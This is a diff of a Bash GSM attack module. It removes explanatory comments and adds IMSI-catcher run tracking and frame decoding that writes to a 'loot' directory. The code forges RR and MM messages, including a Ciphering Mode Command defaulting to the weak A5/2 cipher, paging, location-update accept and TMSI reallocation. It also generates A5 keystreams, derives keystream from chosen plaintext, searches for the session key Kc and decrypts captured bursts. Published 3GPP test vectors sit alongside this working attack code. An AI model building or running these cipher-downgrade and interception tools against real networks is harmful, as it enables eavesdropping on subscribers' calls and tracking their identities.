+gatk_mobile_identity_tmsi() {
     local t; t=$(gatk_norm_hex "${1:-}")
     [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\tTMSI must be 8 hex digits (4 octets)\n' >&2; return 2; }
-    # Octet 3 = (odd/even indicator << 3) | type of identity. A 4-octet binary
-    # TMSI is not BCD digits, so the odd/even indicator is set to 1 (encoded as
-    # the nibble F in bits 5-8) and identity type 100 selects TMSI.
     printf '1705f4%s\n' "$t"
 }
 
-gatk_mobile_identity_imsi() {   # <imsi-digits-6..15>
+gatk_mobile_identity_imsi() {
     local d="${1:-}"
     [[ "$d" =~ ^[0-9]{6,15}$ ]] || {
         printf 'ERROR\tIMSI must be 6..15 digits\n' >&2; return 2; }
-    # TS 24.008 10.5.1.4, wired exactly as 06_gsm_air.sh's own vector reads it
-    # (IMSI 310150123456789 -> 39 01 51 10 32 54 76 98):
-    #   octet 3 = high nibble: the FIRST digit;  low nibble: type 001 | odd bit
-    #   every octet after it = two digits, LOW NIBBLE FIRST
-    # The odd/even indicator is 1 when the last digit is the filler F, which is
-    # needed for an even-length IMSI: the first digit is carried by octet 3, so
-    # an even count leaves an odd number of digits behind.
     local digits="$d"
     if (( ${#digits} % 2 == 0 )); then digits+="f"; fi
     local first="${digits:0:1}" rest="${digits:1}" out="" i
@@ -4106,7 +3436,7 @@ gatk_mobile_identity_imsi() {   # <imsi-digits-6..15>
     printf '17%02x%s\n' "$(( ${#out} / 2 ))" "$out"
 }
 
-gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
+gatk_mobile_identity_decode() {
     local h; h=$(gatk_norm_hex "${1:-}")
     [[ "$h" =~ ^17[0-9a-f]{2,} ]] || {
         printf 'ERROR\tMobile Identity must start with IEI 0x17 and a length octet\n' >&2; return 2; }
@@ -4116,7 +3446,6 @@ gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
         printf 'ERROR\tMobile Identity length octet (%d) disagrees with %d octets present\n' \
                "$len" "$(( ${#body} / 2 ))" >&2; return 2; }
     local o3=$((16#${body:0:2}))
-    # Octet 3 = odd/even indicator in bit 4 (mask 0x08), type of identity in bits 3-1.
     local oei=$(( (o3 >> 3) & 1 ))
     local toi=$(( o3 & 0x07 ))
     printf 'type-of-identity\t%s\n' "$toi"
@@ -4133,9 +3462,6 @@ gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
     if [[ "$toi" == "4" ]]; then
         printf 'tmsi\t%s\n' "${body:2}"
     elif [[ "$toi" == "1" || "$toi" == "2" || "$toi" == "3" ]]; then
-        # BCD digits: octet 3's HIGH nibble is the first digit, then two digits
-        # per octet low-nibble-first. An odd/even indicator of 1 means the final
-        # high nibble is the filler F and is not a digit.
         local digits="${body:0:1}" j
         for (( j = 2; j < ${#body}; j += 2 )); do
             digits+="${body:j+1:1}${body:j:1}"
@@ -4149,13 +3475,7 @@ gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
     fi
 }
 
-# ── RR: CIPHERING MODE COMMAND (TS 44.018 9.1.9 / 10.5.2.9) ────────────
-# PD = 0x06 (RR management) | MT = 0x35 | Cipher Mode Setting | Cipher Response.
-# Cipher Mode Setting (type 1 TV, 1 octet): bits 4-2 = algorithm identifier,
-# bit 1 = SC (0 = do not start ciphering, 1 = start ciphering).
-# The identifier is 0-based on the wire but 1-based in the spec table:
-#   wire 000 -> A5/1, 001 -> A5/2, 010 -> A5/3, 011 -> A5/4, 100 -> A5/5 ...
-gatk_alg_wire_code() {   # <A5/n> -> wire identifier
+gatk_alg_wire_code() {
     case "${1:-}" in
         A5/0|a5/0|0) echo 0 ;;
         A5/1|a5/1|1) echo 0 ;;
@@ -4169,7 +3489,7 @@ gatk_alg_wire_code() {   # <A5/n> -> wire identifier
     esac
 }
 
-gatk_alg_name() {   # wire identifier -> label
+gatk_alg_name() {
     case "${1:-}" in
         0) echo 'A5/1' ;;
         1) echo 'A5/2' ;;
@@ -4182,93 +3502,58 @@ gatk_alg_name() {   # wire identifier -> label
     esac
 }
 
-gatk_build_cipher_mode() {   # <A5/n> [cr]
+gatk_build_cipher_mode() {
     local alg="${1:-A5/2}" cr="${2:-0}" code
     code=$(gatk_alg_wire_code "$alg") || {
         printf 'ERROR\tunknown cipher algorithm "%s" (want A5/1..A5/7)\n' "$alg" >&2; return 2; }
     [[ "$cr" =~ ^[01]$ ]] || { printf 'ERROR\tcipher response must be 0 or 1\n' >&2; return 2; }
     local cms=$(( (code << 1) | 1 ))
-    # Cipher Response: IEI nibble 0x04, CR in bit 5. The bit position is not
-    # what a reading of the figure suggests - table 10.5.2.10.1 prints the CR
-    # bit as "1", and the alarmingly common reading of that is bit 4. Adjudicated
-    # against Wireshark's gsm_a dissector, which is the independent
-    # implementation available here: only octets with bit 5 set decode as
-    # "...1 .... = CR: IMEISV shall be included". With CR in bit 4 a forged
-    # cr=1 command decodes as cr=0, so the parameter silently does nothing.
     local cr_octet=$(( (cr << 4) | 4 ))
-    printf '06'                                                    # PD (RR)
-    printf '35'                                                    # MT CIPHERING MODE COMMAND
+    printf '06'
+    printf '35'
     printf '%02x' "$cms"
     printf '%02x' "$cr_octet"
     printf '\n'
 }
 
-# ── RR: PAGING REQUEST TYPE 1 (TS 44.018 9.1.22) ───────────────────────
-# PD 0x06 | MT 0x21 | octet3: bits 2-1 = paging group (channel needed),
-# bits 4-3 = 00 for type 1 | Channel Needed (optional) | Mobile Identity.
-gatk_build_paging_request() {   # <tmsi-hex8> [paging-group 0..3]
+gatk_build_paging_request() {
     local t; t=$(gatk_norm_hex "${1:-}")
     [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\tpaging-request needs an 8-hex-digit TMSI\n' >&2; return 2; }
     local grp="${2:-0}"
     [[ "$grp" =~ ^[0-3]$ ]] || { printf 'ERROR\tpaging group must be 0..3\n' >&2; return 2; }
-    printf '06'          # PD (RR)
-    printf '21'          # MT PAGING REQUEST TYPE 1
+    printf '06'
+    printf '21'
     printf '%02x' "$(( grp & 0x03 ))"
     gatk_mobile_identity_tmsi "$t"
     printf '\n'
 }
 
-# ── MM: LOCATION UPDATING ACCEPT (TS 24.008 9.2.13) ───────────────────
-# PD 0x05 | skip 0x00 | MT 0x02 | LAI (M, V, 5 octets, NO IEI) |
-# Mobile Identity (O, TLV, IEI 0x17).
-gatk_build_lu_accept() {   # <tmsi-hex8> [mcc] [mnc] [lac]
+gatk_build_lu_accept() {
     local t; t=$(gatk_norm_hex "${1:-}")
     [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\tlu-accept needs an 8-hex-digit TMSI\n' >&2; return 2; }
-    printf '05'      # PD (MM)
-    printf '00'      # skip indicator
-    printf '02'      # MT LOCATION UPDATING ACCEPT
-    # LAI is V-format here: the 5 value octets carry no IEI.
+    printf '05'
+    printf '00'
+    printf '02'
     gatk_lai_encode "${2:-262}" "${3:-01}" "${4:-0000}" | cut -c3-
     gatk_mobile_identity_tmsi "$t"
     printf '\n'
 }
 
-# ── MM: TMSI REALLOCATION COMMAND (TS 24.008 9.2.20) ──────────────────
-# PD 0x05 | skip 0x00 | MT 0x1a | LAI (M, V, 5 octets) |
-# Mobile Identity (M, LV -- a length octet but NO IEI).
-gatk_build_tmsi_realloc() {   # <tmsi-hex8> [mcc] [mnc] [lac]
+gatk_build_tmsi_realloc() {
     local t; t=$(gatk_norm_hex "${1:-}")
     [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
         printf 'ERROR\ttmsi-realloc needs an 8-hex-digit TMSI\n' >&2; return 2; }
-    printf '05'      # PD (MM)
-    printf '00'      # skip indicator
-    printf '1a'      # MT TMSI REALLOCATION COMMAND
+    printf '05'
+    printf '00'
+    printf '1a'
     gatk_lai_encode "${2:-262}" "${3:-01}" "${4:-0000}" | cut -c3-
-    # Mobile Identity in LV format: a length octet first, then the value octet
-    # (odd/even | type of identity = F4 for a 4-octet TMSI) and 4 TMSI octets.
-    # No IEI in the LV form.
     printf '05f4%s' "$t"
     printf '\n'
 }
 
-# ── A5/2 keystream ──────────────────────────────────────────────────────
-# A5/2 is the deliberately weakened export variant. NO public specification
-# and NO public test vectors exist: GSM MoU SG.52 (the algorithm) and SG.53
-# (24 sets of test data) are confidential, as ETSI ETR 278 section 8.3 states
-# explicitly. The structure implemented here is the one published by the
-# cryptanalysis literature (Goldberg/Wagner 1999; Barkan/Biham/Keller,
-# "Instant Ciphertext-Only Cryptanalysis of GSM Encrypted Communication",
-# CRYPTO 2003): four LFSRs of length 19, 22, 23 and 17, majority-clocked on
-# three taps of the 17-bit register, combined by a nonlinear function.
-#
-# What that means for a reader: this generator is CORRECT AS SPECIFIED BY THE
-# PUBLIC LITERATURE but it is NOT certified against an official vector,
-# because no official vector is public. Treat --a5-2-keystream output as a
-# well-formed A5/2 keystream, not as a known-answer-verified one. The A5/1
-# keystream in 06_gsm_air.sh is the one with an official vector.
-gatk_a5_2_bits() {   # <kc-hex16> <count-dec-or-hex> [bits]
+gatk_a5_2_bits() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local cnt="${2:-0}"
     local bits="${3:-228}"
@@ -4282,12 +3567,7 @@ gatk_a5_2_bits() {   # <kc-hex16> <count-dec-or-hex> [bits]
     gatk_crypto a52 "$kc" "$cnt" "$bits"
 }
 
-# ── A5/3 / A5/4 keystream (TS 55.216) ───────────────────────────────────
-# A5/3 = KGCORE with CA=0x0F, CB=0, CD=0, CE=0, CC=COUNT (22 bits), CL=228,
-# and CK = KC||KC when KC is 64 bits. A5/4 is the same function with a
-# 128-bit key (KLEN=128), which is the entire difference between the two.
-# Both are verified against the 3GPP A5/3 implementors' test data.
-gatk_a5_3_bits() {   # <kc-hex> <count> [klen] [bits]
+gatk_a5_3_bits() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local cnt="${2:-0}"
     local klen="${3:-64}"
@@ -4306,24 +3586,14 @@ gatk_a5_3_bits() {   # <kc-hex> <count> [klen] [bits]
     gatk_crypto a53 "$kc" "$cnt" "$klen" | cut -c1-"$bits"
 }
 
-gatk_a5_4_bits() {   # <kc-hex32> <count> [bits]
+gatk_a5_4_bits() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     [[ "$kc" =~ ^[0-9a-f]{32}$ ]] || {
         printf 'ERROR\ta5-4-keystream needs a 128-bit key in hex (32 digits)\n' >&2; return 2; }
     gatk_a5_3_bits "$kc" "${2:-0}" 128 "${3:-228}"
 }
 
-# ── A5/1 keystream ──────────────────────────────────────────────────────
-# A5/1 lives in this module's own core (see the A51 note there) so that a Kc
-# search runs whether or not 06_gsm_air.sh is present. The selftest invokes
-# that module's CLI and asserts the two keystreams match (`x-a51-agree-*`) —
-# a check that actually runs, which is what stops the duplication drifting.
-# A5/1's 22-bit COUNT is NOT the frame number. It is T1 (11 bits) || T3
-# (6 bits) || T2 (5 bits) - the same split the SCH broadcasts, packed in that
-# order (T3 before T2, which is the part everyone gets wrong). Verified
-# against libosmocore's osmo_a5_fn_count(), which is what turns its real
-# frame-number vectors into the count the A5/1 core actually consumes.
-gatk_a5_count() {   # <frame-number 0..2715647>
+gatk_a5_count() {
     local fn="${1:-}"
     [[ "$fn" =~ ^[0-9]+$ ]] && (( fn <= GATK_MAX_FN )) || {
         printf 'ERROR\tframe number must be 0..%s\n' "$GATK_MAX_FN" >&2; return 2; }
@@ -4337,7 +3607,7 @@ gatk_a5_count() {   # <frame-number 0..2715647>
     printf 'count_hex\t0x%X\n' "$cnt"
 }
 
-gatk_a5_1_bits() {   # <kc-hex16> <count-dec-or-hex> [bits] -> 0/1 string
+gatk_a5_1_bits() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local cnt="${2:-0}"
     local bits="${3:-228}"
@@ -4351,7 +3621,7 @@ gatk_a5_1_bits() {   # <kc-hex16> <count-dec-or-hex> [bits] -> 0/1 string
     gatk_crypto a51 "$kc" "$cnt" "$bits"
 }
 
-gatk_a5_1_hex() {   # <kc-hex16> <count> [bits] -> packed hex
+gatk_a5_1_hex() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local cnt="${2:-0}"
     local bits="${3:-228}"
@@ -4363,18 +3633,8 @@ gatk_a5_1_hex() {   # <kc-hex16> <count> [bits] -> packed hex
     gatk_crypto a51hex "$kc" "$cnt" "$bits"
 }
 
-# ── Kc recovery: the computation half ───────────────────────────────────
-# What is recoverable in software is the *arithmetic* of the attack: given a
-# phrase of known plaintext that the attacker chose, the keystream falls out
-# by XOR. Recovering Kc from that keystream is a search over the A5/1 state —
-# 2^64 raw, 2^54 once COMP128's zeroed low bits are accounted for. That is a
-# rainbow-table or GPU-cluster job and stays a handoff; what this module does
-# instead is build the keystream, verify a candidate against it, and run a
-# *bounded* search so the method is testable end to end at reduced width.
 
-# Recover keystream bits from chosen plaintext and the observed ciphertext of
-# the same burst. Both are hex, both the same length, MSB-first per octet.
-gatk_kc_keystream() {   # <known-plaintext-hex> <ciphertext-hex>
+gatk_kc_keystream() {
     local pt; pt=$(gatk_norm_hex "${1:-}")
     local ct; ct=$(gatk_norm_hex "${2:-}")
     [[ "$pt" =~ ^[0-9a-f]+$ ]] && (( ${#pt} % 2 == 0 && ${#pt} > 0 )) || {
@@ -4396,9 +3656,7 @@ sys.stdout.write(ks + "\n")
 PY
 }
 
-# Does this Kc generate that keystream? The oracle an exhaustive search needs,
-# and the verification step for a key recovered from rainbow tables.
-gatk_kc_verify() {   # <kc-hex16> <count> <expected-keystream-0/1>
+gatk_kc_verify() {
     local kc; kc=$(gatk_norm_hex "${1:-}")
     local cnt="${2:-0}"
     local want="${3:-}"
@@ -4427,11 +3685,7 @@ gatk_kc_verify() {   # <kc-hex16> <count> <expected-keystream-0/1>
     return 1
 }
 
-# Bounded exhaustive search over the low bits of the key integer. This is the
-# real search narrowed to a width the operator names, so the method is
-# exhaustively testable at 2^16 and honestly labelled as a handoff at 2^54.
-# The known high bits stay fixed at whatever base-kc supplies.
-gatk_kc_search() {   # <base-kc-hex16> <vary-low-bits> <count> <keystream-0/1> [max-tries]
+gatk_kc_search() {
     local base; base=$(gatk_norm_hex "${1:-}")
     local vary="${2:-0}"
     local cnt="${3:-0}"
@@ -4449,8 +3703,7 @@ gatk_kc_search() {   # <base-kc-hex16> <vary-low-bits> <count> <keystream-0/1> [
     gatk_crypto kcsearch "$base" "$vary" "$cnt" "$want" "$lim"
 }
 
-# ── f8 / f9 (TS 35.201) ─────────────────────────────────────────────────
-gatk_f8_keystream() {   # <ck-hex32> <count> <bearer> <direction> <length-bits>
+gatk_f8_keystream() {
     local ck; ck=$(gatk_norm_hex "${1:-}")
     [[ "$ck" =~ ^[0-9a-f]{32}$ ]] || {
         printf 'ERROR\tf8 needs a 128-bit CK (32 hex digits)\n' >&2; return 2; }
@@ -4458,7 +3711,7 @@ gatk_f8_keystream() {   # <ck-hex32> <count> <bearer> <direction> <length-bits>
     gatk_crypto f8 "$ck" "${2:-0}" "${3:-0}" "${4:-0}" "${5:-228}"
 }
 
-gatk_f9_mac() {   # <ik-hex32> <count> <fresh> <direction> <message-hex> <length-bits>
+gatk_f9_mac() {
     local ik; ik=$(gatk_norm_hex "${1:-}")
     local msg; msg=$(gatk_norm_hex "${5:-}")
     [[ "$ik" =~ ^[0-9a-f]{32}$ ]] || {
@@ -4469,11 +3722,7 @@ gatk_f9_mac() {   # <ik-hex32> <count> <fresh> <direction> <message-hex> <length
     gatk_crypto f9 "$ik" "${2:-0}" "${3:-0}" "${4:-0}" "${msg:-}" "${6:-0}"
 }
 
-# ── keystream -> decryption ─────────────────────────────────────────────
-# XOR a hex ciphertext against a hex keystream. The keystream is applied
-# from its most significant bit, matching the on-air burst order that
-# 06_gsm_air.sh already uses.
-gatk_xor_hex() {   # <ciphertext-hex> <keystream-bits-as-0/1-string>
+gatk_xor_hex() {
     local ct; ct=$(gatk_norm_hex "${1:-}")
     local ks="${2:-}"
     [[ "$ct" =~ ^[0-9a-f]*$ ]] && (( ${#ct} % 2 == 0 )) || {
@@ -4494,16 +3743,11 @@ sys.stdout.write(out.hex() + "\n")
 PY
 }
 
-# ── decrypt ─────────────────────────────────────────────────────────────
-# Derive the keystream for the chosen cipher and XOR it against a hex
-# ciphertext. Keystream length is driven by the ciphertext length, so the
-# caller does not have to know how many bits are needed.
-gatk_cmd_decrypt() {   # <ct-hex> <kc-hex> [alg] [count]
+gatk_cmd_decrypt() {
     local ct; ct=$(gatk_norm_hex "${1:-}")
     local kc; kc=$(gatk_norm_hex "${2:-}")
     local alg="${3:-a5-2}"
     local cnt="${4:-0}"
-    # Accept A5/2, a5-2 and a52 alike: strip the separator before matching.
     local ag; ag="${alg,,}"; ag="${ag//[\/-]/}"
     [[ "$ct" =~ ^[0-9a-f]+$ ]] && (( ${#ct} % 2 == 0 && ${#ct} > 0 )) || {
         printf 'ERROR\tdecrypt needs a non-empty, whole-octet hex ciphertext\n' >&2; return 2; }
@@ -4536,28 +3780,17 @@ except Exception:
     fi
 }
 
-# ── known-answer test vectors ───────────────────────────────────────────
-# Every vector below is transcribed from a published 3GPP/ETSI document.
-# They are the reason the ciphers in this module can be trusted at all.
 gatk_kat_suite() {
     gatk_crypto_load
     local pass=0 fail=0 got want
-    _kat() {   # <name> <got-hex> <want-hex>
+    _kat() {
         if [[ "$2" == "$3" ]]; then
             printf 'KAT\tPASS\t%s\n' "$1"; pass=$((pass+1))
         else
             printf 'KAT\tFAIL\t%s\tgot=%s\twant=%s\n' "$1" "$2" "$3"; fail=$((fail+1))
         fi
     }
-    # A keystream of N bits is compared as a bit string, not as nibbles: GSM
-    # blocks are 114 bits, which is not a multiple of 4, so hex-packing them
-    # would silently drop the trailing 2 bits of every block.
-    # Compare a keystream bit string against a published hex vector.
-    # 114-bit GSM blocks are not a whole number of nibbles, so the published
-    # tables show 29 nibbles (116 bits) with the last nibble padded. Comparing
-    # bit-by-bit over the length the table actually specifies is exact, and
-    # avoids both truncating real bits and accepting padding bits.
-    _katbits() {   # <name> <bit-string> <published-hex>
+    _katbits() {
         local name="$1" bits="$2" want="$3" wan
         wan=$(python3 -c 'import sys
 h=sys.argv[1]
@@ -4569,19 +3802,15 @@ print("".join(format(int(c,16),"04b") for c in h))' "$want")
             printf 'KAT\tFAIL\t%s\tgot=%s\twant=%s\n' "$name" "$bits" "$wan"; fail=$((fail+1))
         fi
     }
-    # --- KASUMI, 3GPP TS 35.203 section 3 (three official test sets) ---
     got=$(gatk_crypto kasumi 2BD6459F82C5B300952C49104881FF48 EA024714AD5C4D84)
     _kat 'kasumi-ts35.203-set1' "$got" 'DF1F9B251C0BF45F'
     got=$(gatk_crypto kasumi 8CE33E2CC3C0B5FC1F3DE8A6DC66B1F3 D3C5D592327FB11C)
     _kat 'kasumi-ts35.203-set2' "$got" 'DE551988CEB2F9B7'
     got=$(gatk_crypto kasumi 4035C6680AF8C6D1A8FF8667B1714013 62A540981BA6F9B7)
     _kat 'kasumi-ts35.203-set3' "$got" '4592B0E78690F71B'
-    # --- f8, 3GPP TS 35.203 section 4 (four official test sets) ---
-    # The f8 KATs are 114-bit blocks concatenated, so compare the bit string.
     _katbits 'f8-ts35.203-set1' "$(gatk_crypto f8 2BD6459F82C5B300952C49104881FF48 0x72A4F20F 0x0C 1 128)" 'AF24CC029AC39D0823DD1041AEECAE7B'
     _katbits 'f8-ts35.203-set2' "$(gatk_crypto f8 EFA8B2229E720C2A7C36EA55E9605695 0xE28BCF7B 0x18 0 128)" '2DFBDE4DF5E23990CA13F589782DD4CA'
     _katbits 'f8-ts35.203-set4' "$(gatk_crypto f8 D3C5D592327FB11C4035C6680AF8C6D1 0x398A59B4 0x05 1 128)" 'C3A2E599FDF270CBAF169C5C14F20EE5'
-    # --- f9, 3GPP TS 35.203 section 5 (three official test sets) ---
     got=$(gatk_crypto f9 2BD6459F82C5B300952C49104881FF48 0x38A6F056 0x05D2EC49 0 \
           6B227737296F393C8079353EDC87E2E805D2EC49A4F2D8E0 189)
     _kat 'f9-ts35.203-set1' "$got" 'F63BD72C'
@@ -4591,13 +3820,10 @@ print("".join(format(int(c,16),"04b") for c in h))' "$want")
     got=$(gatk_crypto f9 FDB9CFDF28936CC483A31869D81B8FAB 0x36AF6144 0x9838F03A 1 \
           5932BC0ACE2B0ABA33D8AC188AC54F346FAD10BF9DEE2920B43BD0C53A915CB7DF6CAA72053ABFF2 319)
     _kat 'f9-ts35.203-set3' "$got" '1537D316'
-    # --- A5/3 + A5/4, 3GPP A5/3 implementors' test data, BLOCK1 of each Klen ---
     _katbits 'a5-3-klen64-set1-block1' "$(gatk_a5_3_bits 2BD6459F82C5BC00 0x24F20F 64 114)" '889EEAAF9ED1BA1ABBD8436232E440'
     _katbits 'a5-3-klen64-set2-block1' "$(gatk_a5_3_bits 952C49104881FF48 0x061272 64 114)" 'FB4D5FBCEE13A33389285686E9A5C0'
     _katbits 'a5-3-klen80-block1' "$(gatk_a5_3_bits 5ACB1D644C0D51204EA5 0x156B26 80 114)" 'E095306AD5086E2EAC7F3107DE4F80'
     _katbits 'a5-4-klen128-block1' "$(gatk_a5_4_bits D3C5D592327FB11C4035C6680AF8C6D1 0x0A59B4 114)" 'DCE64362AB5F89C11EF0B305166540'
-    # --- A5/2: NO official vector exists (see the note on gatk_a5_2_bits).
-    #     What is asserted here is self-consistency, not a published KAT. ---
     local a b
     a=$(gatk_crypto a52 0123456789abcdef 0x123456 228)
     b=$(gatk_crypto a52 0123456789abcdef 0x123456 228)
@@ -4606,26 +3832,8 @@ print("".join(format(int(c,16),"04b") for c in h))' "$want")
     else
         printf 'KAT\tFAIL\ta5-2-determinism-228bit\tdeterminism or length broken\n'; fail=$((fail+1))
     fi
-    # --- A5/1: TWO INDEPENDENT published vectors. One vector alone cannot
     #     catch a wrong tap or a wrong frame-count convention, because a bug in
     #     the vector's own reading passes just as happily as a bug in the core.
-    #     The two below come from different codebases and use different keys,
-    #     different counts and different byte-order conventions.
-    #
-    # (1) Briceno/Goldberg/Wagner pedagogical implementation, test() in
-    #     https://cryptome.org/jya/a51-pi.htm . Key bytes 12 23 45 67 89 AB CD
-    #     EF, 22-bit COUNT 0x134. Its loader reads the key bytes little-endian,
-    #     which is the order the Kc hex is written in here.
-    # (2) libosmocore tests/a5/a5_test.c. Key bytes 01 23 45 67 89 AB CD EF
-    #     with the real GSM frame number 123456, converted with
-    #     osmo_a5_fn_count() to COUNT 0x2EC88. Its loader reads the key bytes
-    #     in REVERSE order (key[7 - (i>>3)]), so the identical 64-bit key is
-    #     written here as the reversed byte string.
-    #
-    # Both vectors also carry an uplink keystream, and in both cases it is
-    # exactly bits 114..227 of the SAME run - A5/1 is one 228-bit generator per
-    # frame, downlink first, not two separate generators. That is asserted
-    # rather than assumed, because getting it wrong halves the keystream.
     local a51 osmo
     a51=$(gatk_a5_1_bits 1223456789abcdef 0x134 228)
     _katbits 'a5-1-bgw-downlink-114' "${a51:0:114}"   '534EAA582FE8151AB6E1855A728C00'
@@ -4639,7 +3847,322 @@ print("".join(format(int(c,16),"04b") for c in h))' "$want")
     (( fail == 0 ))
 }
 
-# ── CLI dispatch ────────────────────────────────────────────────────────
+
+gatk_catcher_store()   { printf '%s/catcher.tsv\n' "$GATK_DIR"; }
+gatk_catcher_runfile() { printf '%s/catcher.run\n' "$GATK_DIR"; }
+gatk_gsmtap_store()    { printf '%s/gsmtap/decoded.tsv\n' "${LOOT_DIR:-}"; }
+
+gatk_catcher_header() {
+    printf 'ts\tts_epoch\trun\tstep\tchannel\tdirection\tprotocol\tmessage_type\tmessage\tsource\n'
+}
+
+gatk_catcher_init() {
+    mkdir -p "$GATK_DIR" 2>/dev/null
+    local db; db=$(gatk_catcher_store)
+    [[ -f "$db" ]] || gatk_catcher_header > "$db"
+}
+
+gatk_disc_name() {
+    case "$(gatk_norm_hex "${1:-00}")" in
+        05) echo MM  ;; 06) echo RR ;; 03) echo SMS ;;
+        01|02) echo CC ;; *) echo unknown ;;
+    esac
+}
+
+gatk_l3_type_name() {
+    local p="${1:-}" t; t=$(printf '%s' "${2:-}" | tr 'a-f' 'A-F')
+    case "$p" in
+        RR) case "$t" in
+                19) echo "SYSTEM INFORMATION TYPE 1"  ;; 1A) echo "SYSTEM INFORMATION TYPE 2" ;;
+                1B) echo "SYSTEM INFORMATION TYPE 3"  ;; 1C) echo "SYSTEM INFORMATION TYPE 4" ;;
+                00) echo "SYSTEM INFORMATION TYPE 13" ;; 02) echo "SYSTEM INFORMATION TYPE 2BIS" ;;
+                03) echo "SYSTEM INFORMATION TYPE 2TER" ;; 1D) echo "SYSTEM INFORMATION TYPE 5" ;;
+                21) echo "PAGING REQUEST TYPE 1"      ;; 27) echo "PAGING RESPONSE" ;;
+                3F) echo "IMMEDIATE ASSIGNMENT"       ;; 35) echo "CIPHERING MODE COMMAND" ;;
+                0D) echo "CHANNEL RELEASE"            ;; esac ;;
+        MM) case "$t" in
+                05) echo "LOCATION UPDATING REQUEST"  ;; 08) echo "AUTHENTICATION AND CIPHERING REQUEST" ;;
+                18) echo "IDENTITY REQUEST"           ;; 19) echo "IDENTITY RESPONSE" ;;
+                24) echo "CM SERVICE REQUEST"         ;; esac ;;
+    esac
+}
+
+gatk_shape_out() {
+    local form="$1" pd="$2" t="$3" addr="${4:-}" ctrl="${5:-}"
+    local proto name
+    proto=$(gatk_disc_name "$(printf '%02x' "$pd")")
+    name=$(gatk_l3_type_name "$proto" "$t")
+    printf 'form\t%s\n' "$form"
+    [[ -n "$addr" ]] && printf 'address\t%s\ncontrol\t%s\n' "$addr" "$ctrl"
+    printf 'protocol\t%s\n' "$proto"
+    printf 'discriminator\t0x%02x\n' "$pd"
+    printf 'message_type\t0x%s\n' "$(printf '%s' "$t" | tr 'A-F' 'a-f')"
+    printf 'message\t%s\n' "${name:-unknown}"
+    [[ -n "$name" ]] || return 3
+    return 0
+}
+
+gatk_shape_bcch() {
+    local hex="$1"
+    [[ "${hex:0:4}" == "0303" ]] && hex="${hex:4}"
+    (( ${#hex} >= 6 )) || return 3
+    gatk_shape_out bcch "$(( 0x${hex:2:2} & 0x0f ))" "${hex:4:2}"
+}
+
+gatk_shape_lapdm() {
+    local hex="$1" addr ctrl rest b2 nrem len
+    addr=$(( 0x${hex:0:2} ))
+    (( addr & 1 )) || return 4
+    ctrl=$(( 0x${hex:2:2} ))
+    rest="${hex:4}"
+    (( ${#rest} >= 4 )) || return 3
+    b2=$(( 0x${rest:0:2} ))
+    nrem=$(( ${#rest} / 2 - 1 ))
+    len=$(( (b2 >> 2) & 0x3f ))
+    if (( (b2 & 1) == 1 )) && (( len == nrem && len > 0 )); then rest="${rest:2}"; fi
+    (( ${#rest} >= 4 )) || return 3
+    gatk_shape_out lapdm "$(( 0x${rest:0:2} & 0x0f ))" "${rest:2:2}" \
+        "$(printf '%02x' "$addr")" "$(printf '%02x' "$ctrl")"
+}
+
+gatk_decode_frame() {
+    local hex chan="${2:-}" pref a b ra rb
+    hex=$(gatk_norm_hex "${1:-}")
+    if [[ -z "$hex" ]] || (( ${#hex} < 8 )) || (( ${#hex} % 2 )); then
+        printf 'ERROR\tnot a frame: %s\n' "$(gatk_sanitize "${1:-}")" >&2
+        return 2
+    fi
+    case "${chan^^}" in
+        BCCH|CCCH|AGCH|PCH|CBCH*) pref=bcch  ;;
+        *)                        pref=lapdm ;;
+    esac
+    if [[ "$pref" == bcch ]]; then
+        a=$(gatk_shape_bcch "$hex");  ra=$?
+        b=$(gatk_shape_lapdm "$hex"); rb=$?
+    else
+        b=$(gatk_shape_lapdm "$hex"); rb=$?
+        a=$(gatk_shape_bcch "$hex");  ra=$?
+    fi
+    if [[ "$pref" == bcch ]]; then
+        (( ra == 0 )) && { printf '%s\n' "$a"; return 0; }
+        (( rb == 0 )) && { printf '%s\n' "$b"; return 0; }
+    else
+        (( rb == 0 )) && { printf '%s\n' "$b"; return 0; }
+        (( ra == 0 )) && { printf '%s\n' "$a"; return 0; }
+    fi
+    local first="$a" rfirst=$ra
+    [[ "$pref" == lapdm ]] && { first="$b"; rfirst=$rb; }
+    if (( rfirst == 3 )); then
+        printf '%s\n' "$first"
+        printf 'ERROR\tthe frame carries a message type this table does not name\n' >&2
+        return 3
+    fi
+    printf 'ERROR\tthe frame is neither a BCCH block nor a LAPDm frame this tree reads\n' >&2
+    return 4
+}
+
+gatk_catcher_step_of() {
+    gatk_imsi_catcher_sequence | awk -F'\t' -v p="${1:-}" -v t="${2:-}" '
+        NR > 1 && toupper($5) == toupper(p) && toupper($6) == toupper(t) { print $1; exit }'
+}
+
+gatk_catcher_run_name() {
+    if [[ -n "${1:-}" ]]; then printf '%s\n' "$1"; return 0; fi
+    local f; f=$(gatk_catcher_runfile)
+    if [[ -s "$f" ]]; then
+        local r; r=$(head -n 1 "$f" | tr -cd 'A-Za-z0-9._-')
+        [[ -n "$r" ]] && { printf '%s\n' "$r"; return 0; }
+    fi
+    printf 'gsm-%s\n' "$(date -u +%Y%m%dT%H%M%SZ)"
+}
+
+gatk_catcher_run_start() {
+    mkdir -p "$GATK_DIR" 2>/dev/null
+    local run; run=$(gatk_catcher_run_name "${1:-}")
+    printf '%s\n' "$run" > "$(gatk_catcher_runfile)"
+    gatk_catcher_init
+    printf 'run\t%s\n' "$run"
+    printf 'store\t%s\n' "$(gatk_catcher_store)"
+    printf 'note\tevery --catcher-watch from now on adds to this run until --catcher-run-start names another\n'
+}
+
+gatk_catcher_run_stop() {
+    local run; run=$(gatk_catcher_run_name "")
+    local prog; prog=$(gatk_catcher_progress_tsv --run "$run" 2>/dev/null)
+    local seen=0 total=0 idents=0
+    total=$(printf '%s\n' "$prog" | awk -F'\t' 'NR>1 && NF' | grep -c . || true)
